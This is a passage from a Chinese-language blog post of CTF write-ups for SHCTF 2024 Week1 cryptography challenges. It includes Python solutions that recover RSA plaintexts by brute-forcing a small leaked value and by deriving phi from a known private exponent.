加密后的密文</span><br><span class="line">ciphertext = b&#x27;\x01\xbd\x93\x96\xa3;\x1eW\xfa\xf1\xec\x10\xb8Ks\x86\x9d]\x87\x932\xfc0\xda\r\x98\xcfv\xb4\xb4Vj5\xe8\xd1\x88\xf5\x9a\xa8\x89\xa2\xebVj;4\x90j&#x27;</span><br><span class="line"></span><br><span class="line"># 解密</span><br><span class="line">decrypted = my_aes.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"># 移除填充的空格字节</span><br><span class="line">plaintext = decrypted.rstrip(b&#x27; &#x27;)</span><br><span class="line">print(plaintext)</span><br></pre></td></tr></table></figure>

<h4 id="Week1-baby-mod"><a href="#Week1-baby-mod" class="headerlink" title="[Week1] baby_mod"></a>[Week1] baby_mod</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312017171.png" alt="image-20241031201709131" loading="lazy"></p>
<p>此时我们知道了r，也就是说如果我们知道了tmp，就能计算出r对于t的逆元，就可以求出p，而tmp只有15bit，可以很快的遍历出来。</p>
<p>遍历p，逐一解密密文，明文中包含SHCTF的即为所求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">from tqdm import *</span><br><span class="line"></span><br><span class="line">c = 79650255924640441243783174315738119783087054428100187253964031045992984620971879440861726176524336451142891982435118150281255051661584547445199746244544425882305155402589125955199617147930949561958885307377843571691020998368159145257218511196817046406536607508747287748359813285385239057197003234628847079939</span><br><span class="line">leak = -2599222796268155672542615057820311188233596084301204730398124299903057773299164321565684294941437840950319988869184017952143214614546298874735930095707443093006166798980132582791121684360595863075969212106829764572515951966651060430710482809252673230819220874013454674514944846921907088042630911813223918291506413183923253016666716689505955468069348342349098701467897450818524506135076565</span><br><span class="line">r = 587682058314915471307923755715428788638634300872408087916288745237852083576968681013764877646877289262026854782255141434805121509775923799604299891162530112557931041695494035876437072363827072790300504458703299756480581043027342577811</span><br><span class="line">t = 786699786866467436790075506076086854735027138153074424854186047828932863337885476336794620298737490235145874475196933459185319123588161523141227394517491113980132701124357536717210954797397468992341668471278315484594606850091171557027</span><br><span class="line">e = 65537</span><br><span class="line">for tmp in trange(2**14,2**15-1):</span><br><span class="line">    if isPrime(tmp):</span><br><span class="line">        p = (leak+tmp)*gmpy2.invert(r,t) % t</span><br><span class="line">        try:</span><br><span class="line">            d = gmpy2.invert(e,p-1)</span><br><span class="line">            m = pow(c,d,p)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            if b&#x27;SHCTF&#x27; in flag:</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>

<h4 id="Week1-d-known"><a href="#Week1-d-known" class="headerlink" title="[Week1] d_known"></a><strong>[Week1] d_known</strong></h4><p>我们已知e和d的值</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312026817.png" alt="image-20241031202659774" loading="lazy"></p>
<p>通过计算可知，e是17位，d是2047为，phi大概是2048位，因此我们可以推测k的值</p>
<p>然后求pq,q &#x3D; next_prime(p),qp接近，直接对phi开方然后用next_prime、prevprime即可求出pq</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import sympy</span><br><span class="line">from tqdm import*</span><br><span class="line">c = 7619231789171995079294161234878423224231112429961838535540784984692964815324726959511719538222968332975752824731741518178086141907611550871403019016043596256109736194533826456432379700265157548262751707387902955474794955342745211189261217839388458558541610855570638979485715875458613584721374740387313646656453429749782646888147442107673006666786913122872882361836572072790817898782976016388830432654146591375959261230147062213668563221742359906177903255156356636148427480411387914934792027752124681828051885054176487796901097076771710538908474521518771489253933284065313644010703407250057718304709566471764216008833</span><br><span class="line">d = 4294890607908962616910170813936418137933989254123469803555687713508290441430349302109331416858412706457372735008848759911973894659751982291314717306592060486109717936934227859107527548007636110978177943504153504830427399670018088103145473328301738295079451783784918523654258608563796681268583347612365317742686170548984200881695503824129779720121644547769626667999547773210219170161559351337037056795720068516329254135806201887544486689070012222188533868735009912244250883223795602440999145676619713422671945150578230992434086632731164719925391045521061782211037385447361025091612158568846980146769425987904420426593</span><br><span class="line">e = 65537</span><br><span class="line">kphi = e*d-1</span><br><span class="line">for i in trange(2**13,2**17):</span><br><span class="line">    if kphi%i == 0:</span><br><span class="line">        phi = kphi//i</span><br><span class="line">        temp = gmpy2.iroot(phi,2)[0]</span><br><span class="line">        p = gmpy2.next_prime(temp)</span><br><span class="line">        q = sympy.prevprime(temp)</span><br><span class="line">        if d == inverse(e,(p-1)*(q-1)):</span><br><span class="line">            m = pow(c,d,p*q)</span><br><span class="line">            print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinseyy.github.io/2024/10/05/shCTF/" title="shCTF">https://kinseyy.github.io/2024/10/05/shCTF/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/10/08/2024-NSS%E7%A7%8B%E5%AD%A3%E8%B5%9B/" rel="prev" title="2024.NSS秋季赛"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">2024.NSS秋季赛</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/04/SWPU2019-Web1/" rel="next" title="[SWPU2019]Web1"><span class="post-nav-text">[SWPU2019]Web1</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/kinseyy/kinseyy.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/10/05/shCTF/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备17038157号</a></div><div class="copyright"><span>&copy; 2023 – 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinseyy" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="开往-友链接力"><img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script></body></html>